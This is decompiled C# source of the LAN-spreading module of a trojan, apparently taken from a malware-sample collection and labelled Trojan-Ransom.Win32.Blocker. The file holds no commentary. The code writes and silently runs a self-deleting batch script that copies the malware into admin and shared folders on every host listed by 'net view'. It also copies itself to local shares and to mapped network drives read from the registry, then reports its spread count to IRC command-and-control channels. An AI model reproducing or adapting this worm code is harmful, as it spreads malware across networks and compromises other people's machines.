// Decompiled with JetBrains decompiler
// Type: rundll32.spreaders.lan
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Windows.Forms;

namespace rundll32.spreaders
{
  internal class lan
  {
    public static void spread(string name, irc irc)
    {
      int num = 0;
      StreamWriter streamWriter = new StreamWriter("share.bat");
      streamWriter.WriteLine("@echo off & break off");
      streamWriter.WriteLine("net view >log.txt");
      streamWriter.WriteLine("for /f %%t in (log.txt) do ( ");
      streamWriter.WriteLine("copy \"" + name + "\" %%t\\debug.exe");
      streamWriter.WriteLine("copy \"" + name + "\" %%t\\IPC$\\debug.exe");
      streamWriter.WriteLine("copy \"" + name + "\" %%t\\ADMIN$\\debug.exe");
      streamWriter.WriteLine("copy \"" + name + "\" %%t\\C$\\debug.exe");
      streamWriter.WriteLine("copy \"" + name + "\" %%t\\D$\\debug.exe");
      streamWriter.WriteLine("copy \"" + name + "\" %%t\\PRINT$\\debug.exe");
      streamWriter.WriteLine("copy \"" + name + "\" %%t\\e$\\debug.exe");
      streamWriter.WriteLine("copy \"" + name + "\" %%t\\e$\\shared\\debug.exe");
      streamWriter.WriteLine("copy \"" + name + "\" %%t\\d$\\shared\\debug.exe");
      streamWriter.WriteLine("copy \"" + name + "\" %%t\\C$\\shared\\debug.exe");
      streamWriter.WriteLine("copy \"" + name + "\" %%t\\shared\\debug.exe");
      streamWriter.WriteLine(")");
      streamWriter.WriteLine("del log.txt");
      streamWriter.WriteLine("del %0");
      streamWriter.Close();
      new Process()
      {
        StartInfo = {
          WindowStyle = ProcessWindowStyle.Hidden,
          FileName = "share.bat"
        }
      }.Start();
      try
      {
        foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("select * from win32_share").Get())
        {
          string str = Convert.ToString(managementBaseObject["Name"]);
          if (!str.Contains("$"))
          {
            try
            {
              File.Copy(Application.ExecutablePath, "\\\\" + Environment.MachineName + "\\" + str + "\\winadmin-setup.exe", true);
              ++num;
            }
            catch
            {
            }
          }
        }
      }
      catch (Exception ex)
      {
      }
      try
      {
        string name1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive MRU\\";
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name1);
        foreach (string valueName in registryKey.GetValueNames())
        {
          string str = registryKey.GetValue(valueName).ToString();
          if (valueName.ToLower() != "mrulist")
          {
            try
            {
              File.Copy(Application.ExecutablePath, str + "\\\\winadmin-setup.exe", true);
              ++num;
            }
            catch
            {
            }
          }
        }
        registryKey.Close();
      }
      catch (Exception ex)
      {
      }
      foreach (string[] onConnChannel in config.onConnChannels)
      {
        if (num != 0)
          irc.sendMessage(onConnChannel[0], ".:LAN:. - \u000308Spreaded to \u000309" + num.ToString() + "\u000308 locations!");
      }
    }
  }
}
